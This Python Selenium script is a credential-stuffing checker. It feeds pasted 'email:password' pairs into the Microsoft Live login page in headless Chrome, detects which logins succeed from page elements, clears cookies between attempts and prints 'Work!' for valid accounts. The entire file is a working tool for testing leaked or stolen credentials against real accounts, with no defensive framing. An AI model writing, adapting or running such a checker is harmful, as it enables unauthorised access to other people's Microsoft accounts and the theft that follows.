from selenium.webdriver.common.action_chains import ActionChains
from time import sleep
from os import getcwd
from os import system
from selenium import webdriver
import tkinter as tk
from tkinter import filedialog
from selenium.webdriver.common import keys
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

def TryFind(xpath):
    try:
        driver.find_element_by_xpath(xpath)
        return True
    except NoSuchElementException:
        return False

def SeleniumRetry(tries, driver, timeout,  xpath):
    tries_count = 0
    for i in range(tries):
        try:
            driver.find_element_by_xpath(xpath)
            break
        except NoSuchElementException:
            tries_count +=1
            if tries_count == tries:
                raise NoSuchElementException
        sleep(timeout)

def Paste():
    list =[]
    print("paste")
    while True:
        input_ = input("")
        if input_ == "clear":
            list.clear()
            system("cls")
            print("paste")
            continue
        if input_ == "":
            return list
        else:
            list.append(input_)

def ActionTab():
    actions = ActionChains(driver)
    actions.send_keys(Keys.TAB)
    actions.perform()

def ActionArrowDown():
    actions = ActionChains(driver)
    actions.send_keys(Keys.ARROW_DOWN)
    actions.perform()

def ActionEnter():
    actions = ActionChains(driver)
    actions.send_keys(Keys.ENTER)
    actions.perform()

def ActionBackSpace():
    actions = ActionChains(driver)
    actions.send_keys(Keys.BACKSPACE)
    actions.perform()

def ActionSpace():
    actions = ActionChains(driver)
    actions.send_keys(Keys.SPACE)
    actions.perform()

def ActionKeys(something):
    actions = ActionChains(driver)
    actions.send_keys(something)
    actions.perform()

options = webdriver.ChromeOptions()
options.add_argument("--headless")
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(str(getcwd().split("\\")[:-1]).replace("'", "").replace(",", "").replace(" ", "\\")[1:-1] + "\\chromedriver.exe",  chrome_options=options)
driver.get("https://login.live.com/")
driver.execute_script("window.open('https://login.live.com/')")
driver.switch_to_window(driver.window_handles[0])

count = [0]

def CheckEmail(Email, Password):
    for i in Emails[count[0]]:
        ActionBackSpace()
    ActionKeys(Email)
    ActionEnter()
    for i in range(20):
        if TryFind(xpath="/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div[1]/div[3]/div/div/div/div[2]/div[1]/div") == True:
            count[0]+=1
            return False
        elif TryFind(xpath="/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div/div[3]/div/div[1]/div/div/button") == True:
            break
        if i == 19:
            raise Exception(NoSuchElementException)
        sleep(0.5)
    ActionKeys(Password)
    ActionEnter()
    for i in range(20):
        if TryFind(xpath="/html/body/div/form/div/div/div[2]/div[1]/div/div/div/div/div/div[3]/div/div[2]/div/div[3]/div[1]/div/label/input") == True:
            driver.switch_to_window(driver.window_handles[1])
            driver.delete_all_cookies()
            driver.switch_to_window(driver.window_handles[0])
            driver.back()
            count[0]+=1
            return True
        if TryFind(xpath="/html/body/div[1]/div/div/div[2]/div/div[1]/div[2]/div/div[2]/div[2]/div/div/section/div/div[1]") == True:
            driver.switch_to_window(driver.window_handles[1])
            driver.delete_all_cookies()
            driver.switch_to_window(driver.window_handles[0])
            driver.back()
            count[0]+=1
            return False
        if TryFind(xpath="/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div/div[3]/div/div[2]/div/div[3]/div/div[1]/div/a") == True:
            driver.switch_to_window(driver.window_handles[1])
            driver.delete_all_cookies()
            driver.switch_to_window(driver.window_handles[0])    
            driver.back()       
            count[0]+=1 
            return False
        sleep(0.5)
    raise Exception(NoSuchElementException)

Emails = []
Passwords = []
count_ = 0
count__ = 0

file = filedialog.askopenfile(mode="r", title="Select A File", filetypes =[('Text Files', '*.txt')])
print(file)

for i in Paste():
    Emails.append(str(i).split(":")[0])
    Passwords.append(str(i).replace(str(i).split(":")[0] + ":", ""))
    count__ +=1
for i in Emails:
    print("\ntested:" + str(count[0]).rstrip().lstrip() + "/" + str(count__), end="\r")
    CheckEmail_  = CheckEmail(str(Emails[count_]).split(":")[0].replace("[", "").replace("'", "").replace(",", "").replace("]", ""), str(Passwords[count_]))
    if CheckEmail_ == False:
        print("Doesn't Work!")
    elif CheckEmail_ == True:
        print("Work!        ")
    count_ +=1